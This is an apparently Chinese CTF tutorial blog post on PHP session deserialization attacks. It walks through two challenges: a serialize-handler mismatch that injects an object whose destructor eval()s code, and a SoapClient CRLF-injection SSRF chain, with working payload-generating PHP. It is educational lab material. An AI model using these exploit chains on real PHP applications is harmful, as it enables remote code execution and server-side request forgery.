<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="与其哀叹，不如埋头苦干"><title>PHP反序列化入门之session反序列化 | Mochazz's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/"></a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/tx.jpeg" width="128" height="128"></a><h1 class="ttl"><a href="/">Mochazz's blog</a></h1></div><p class="m-desc">与其哀叹，不如埋头苦干</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><span class="dot">●</span><span>友链</span><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lmxspace.com">l1nk3r</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.virzz.com">Virink</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://sec2hack.com">Wfox</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lsafe.org">离心</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.kingkk.com">kingkk</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://hpdoger.me">hpdoger</a></li></ul></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">PHP反序列化入门之session反序列化</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2019/01/29/PHP反序列化入门之session反序列化/">2019-01-29</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF竞赛训练/">CTF竞赛训练</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="PHP的session机制"><a href="#PHP的session机制" class="headerlink" title="PHP的session机制"></a>PHP的session机制</h2><p>在学习 <strong>session</strong> 反序列化之前，我们需要了解这几个参数的含义。</p>
<table>
<thead>
<tr>
<th>Directive</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>session.save_handler</td>
<td>session保存形式。默认为files</td>
</tr>
<tr>
<td>session.save_path</td>
<td>session保存路径。</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>session序列化存储所用处理器。默认为php。</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>将上传文件的进度信息存在session中。默认开启。</td>
</tr>
</tbody>
</table>
<p>我们先通过一个样例代码，看看3种不同的 <strong>session</strong> 序列化处理器处理 <strong>session</strong> 的情况。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'mochazz'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当 <strong>session.serialize_handler=php</strong> 时，session文件内容为：  <code>name|s:7:&quot;mochazz&quot;;</code> </p>
<p>当 <strong>session.serialize_handler=php_serialize</strong> 时，session文件为： <code>a:1:{s:4:&quot;name&quot;;s:7:&quot;mochazz&quot;;}</code> </p>
<p>当 <strong>session.serialize_handler=php_binary</strong> 时，session文件内容为： <code>二进制字符names:7:&quot;mochazz&quot;;</code> </p>
<p>再来看看 <strong>session.upload_progress.enabled</strong> 。</p>
<blockquote>
<p>当 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled" target="_blank" rel="noopener">session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p>
<p>当一个上传在处理中，同时POST一个与INI中设置的<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name" target="_blank" rel="noopener">session.upload_progress.name</a>同名变量时，上传进度可以在<a href="http://php.net/manual/zh/reserved.variables.session.php" target="_blank" rel="noopener">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a href="http://php.net/manual/zh/reserved.variables.session.php" target="_blank" rel="noopener">$_SESSION</a>中添加一组数据, 索引是<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix" target="_blank" rel="noopener">session.upload_progress.prefix</a> 与 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name" target="_blank" rel="noopener">session.upload_progress.name</a>连接在一起的值。 </p>
</blockquote>
<p>通常这些键值可以通过读取INI设置来获得，例如：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = ini_get(<span class="string">"session.upload_progress.prefix"</span>) . ini_get(<span class="string">"session.upload-progress.name"</span>);</span><br><span class="line">var_dump($_SESSION[$key]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>更多细节请参考：<a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">http://php.net/manual/zh/session.upload-progress.php</a></p>
<p>如果想看上面说的这个存在 <strong>$_SESSION</strong> 数组中的信息，我们需要先将 <strong>session.upload_progress.cleanup</strong> 设置成 <strong>Off</strong> 。</p>
<p><img src="/img/PHP反序列化入门之session反序列化/1.png" alt="1"></p>
<p>接下来我们通过两个CTF题目来学习 <strong>session</strong> 反序列化问题。</p>
<h2 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h2><p><img src="/img/PHP反序列化入门之session反序列化/2.png" alt="2"></p>
<p><img src="/img/PHP反序列化入门之session反序列化/3.png" alt="3"></p>
<p>可以看到题目环境中的 <strong>session.serialize_handler</strong> 默认为 <strong>php_serialize</strong> 处理器，而程序使用的却是 <strong>php</strong> 处理器，而且开头 <strong>第4行</strong> 使用了 <strong>session_start()</strong> 函数，那么我们就可以利用 <strong>session.upload_progress.enabled</strong> 来伪造 <strong>session</strong> ，然后在 <strong>PHP</strong> 反序列化 <strong>session</strong> 文件时，还原 <strong>OowoO</strong> 类，最终执行 <strong>eval</strong> 函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'echo system("pwd");'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'payload'</span>] = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="comment">// 生成session文件内容为：</span></span><br><span class="line"><span class="comment">// payload|O:5:"OowoO":1:&#123;s:4:"mdzz";s:19:"echo system("pwd");";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们可以通过如下表单，抓包修改 <strong>filename</strong> 为 <strong>payload</strong> 即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://localhost/demo.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"&lt;?php echo ini_get("</span>session.upload_progress.name<span class="string">"); ?&gt;"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>最终会生成一个 <strong>session</strong> 文件， <strong>php</strong> 在获取 <strong>session</strong> 的时候，会按照 <strong>session.serialize_handler=php</strong> 规则来处理 <strong>session</strong> 文件，将 <strong>|</strong> 符号之前的所有内容认为是键名，之后的内容则用于反序列化。</p>
<p><img src="/img/PHP反序列化入门之session反序列化/4.png" alt="4"></p>
<p>在程序运行结束时，调用 <strong>OowoO</strong> 类的 <strong>__destruct</strong> 方法，最终触发代码执行操作。</p>
<h2 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h2><p><img src="/img/PHP反序列化入门之session反序列化/5.png" alt="5"></p>
<p>在 <strong>index.php</strong> 文件中，看到 <strong>第5行</strong> 的 <strong>call_user_func</strong> 方法，其参数二的位置固定为 <strong>$_POST</strong> 数组，我们很容易便想到利用 <strong>extract</strong> 函数进行变量覆盖，以便配合后续利用。 <strong>第6-8</strong> 行代码又存在 <strong>session</strong> 伪造漏洞，我们可以考虑是否可以包含 <strong>session</strong> 文件或者利用 <strong>session</strong> 反序列化漏洞。 <strong>第12行</strong> 的 <strong>call_user_func</strong> 函数的第一个参数虽然被固定为 <strong>implode</strong> ，但是我们可以通过前面的 <strong>extract</strong> 函数进行变量覆盖（注意：在PHP7.x比较新的版本中，已经不允许动态调用 <strong>extract</strong> 函数了）。而 <strong>flag.php</strong> 文件中告诉我们，只有 <strong>127.0.0.1</strong> 请求该页面才能得到 <strong>flag</strong> ，所以这明显又是考察 <strong>SSRF</strong> 漏洞，这里我们便可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> 方法来进行 <strong>SSRF</strong> 。</p>
<p>下面我们通过一个例子，来看看 <strong>SoapClient</strong> 类的 <strong>__call</strong> 方法如何使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://localhost:2333"</span>;</span><br><span class="line">$options = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"location"</span> =&gt; $target,</span><br><span class="line">    <span class="string">"user_agent"</span> =&gt; <span class="string">"mochazz\r\nCookie: PHPSESSID=123123\r\n"</span>,</span><br><span class="line">    <span class="string">"uri"</span> =&gt; <span class="string">"demo"</span></span><br><span class="line">);</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,$options);</span><br><span class="line">$payload = serialize($attack);</span><br><span class="line">unserialize($payload)-&gt;ff(); <span class="comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于 <strong>PHP</strong> 中的原生 <strong>SoapClient</strong> 类存在 <strong>CRLF</strong> 漏洞，所以我们可以伪造任意 <strong>header</strong> 信息，上面的请求结果如下：</p>
<p><img src="/img/PHP反序列化入门之session反序列化/6.png" alt="6"></p>
<p>而 <strong>call_user_func</strong> 函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">"myclass"</span>;</span><br><span class="line">call_user_func(<span class="keyword">array</span>($classname, <span class="string">'say_hello'</span>));</span><br><span class="line">call_user_func($classname .<span class="string">'::say_hello'</span>); <span class="comment">// As of 5.2.3</span></span><br><span class="line"></span><br><span class="line">$myobject = <span class="keyword">new</span> myclass();</span><br><span class="line">call_user_func(<span class="keyword">array</span>($myobject, <span class="string">'say_hello'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样题目中的 <strong>call_user_func($b,$a)</strong> 就可以变成 <strong>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</strong> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p>
<p>这里还要提及一点的是 <strong>session_start</strong> 函数从 <strong>PHP7</strong> 开始允许通过参数来设置 <strong>session</strong> 运行时配置。例如： <code>session_start(array(&#39;serialize_handler&#39; =&gt; &#39;php_serialize&#39;))</code> 将会设置 <strong>session.serialize_handler=php_serialize</strong> 。</p>
<p>最终我们的利用方法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$post_data = <span class="string">'flag=demo'</span>;</span><br><span class="line">$ua = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'mochazz'</span>,</span><br><span class="line">    <span class="string">'Content-Type: application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=mochazz'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$options = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; join(<span class="string">"\r\n"</span>,$ua) . <span class="string">"\r\nContent-Length: "</span> . (string) strlen($post_data). <span class="string">"\r\n\r\n"</span> . $post_data,</span><br><span class="line">    <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$serialize_string = serialize(<span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,$options));</span><br><span class="line"><span class="keyword">echo</span> urlencode($serialize_string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/PHP反序列化入门之session反序列化/7.png" alt="7"></p>
<p><img src="/img/PHP反序列化入门之session反序列化/8.png" alt="8"></p>
<p>最后我们再将 <strong>PHPSESSID</strong> 修改成 <strong>mochazz</strong> 即可获得 <strong>flag</strong> ，整个攻击的流程图如下：</p>
<p><img src="/img/PHP反序列化入门之session反序列化/9.png" alt="9"></p>
<p>例二题目环境可以从 <a href="https://github.com/CTFTraining/lctf_2018_bestphp_s_revenge" target="_blank" rel="noopener">这里</a> 下载。</p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="https://mochazz.github.io">Mochazz</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2019/01/29/PHP反序列化入门之session反序列化/">https://mochazz.github.io/2019/01/29/PHP反序列化入门之session反序列化/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://mochazz.github.io">Mochazz的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/CTF/">CTF</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2019/02/02/PHP反序列化入门之phar/">&lt; PHP反序列化入门之phar</a><a class="next" href="/2019/01/29/PHP反序列化入门之常见魔术方法/">PHP反序列化入门之常见魔术方法 &gt;</a></div><div id="valine-comment"><style type="text/css">.v * { color: #CECECE; }
.v a { color: #0F9FB4; }
.v a:hover { color: #216C73; }
.v li { list-style: inherit; }
.v .vwrap { border: 1px solid #223441; border-radius: 0; }
.v .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.v .vbtn { border-radius: 0; color: #cecece; background: none; }
.v .vlist .vcard .vh { border-bottom-color: #293D4E; }
.v .vwrap .vheader .vinput { border-bottom-color: #223441; }
.v .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.v code, .v pre,.v .vlist .vcard .vhead .vsys { background: #203240; }
.v .vlist .vcard .vcontent.expand:before { background: linear-gradient(180deg,hsla(206,33%,19%,0),hsla(206,33%,19%,.9)); }
.v .vlist .vcard .vcontent.expand:after { background: hsla(206,33%,19%,.9); }</style><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2017 - 2019 <a href="/." rel="nofollow">Mochazz's blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>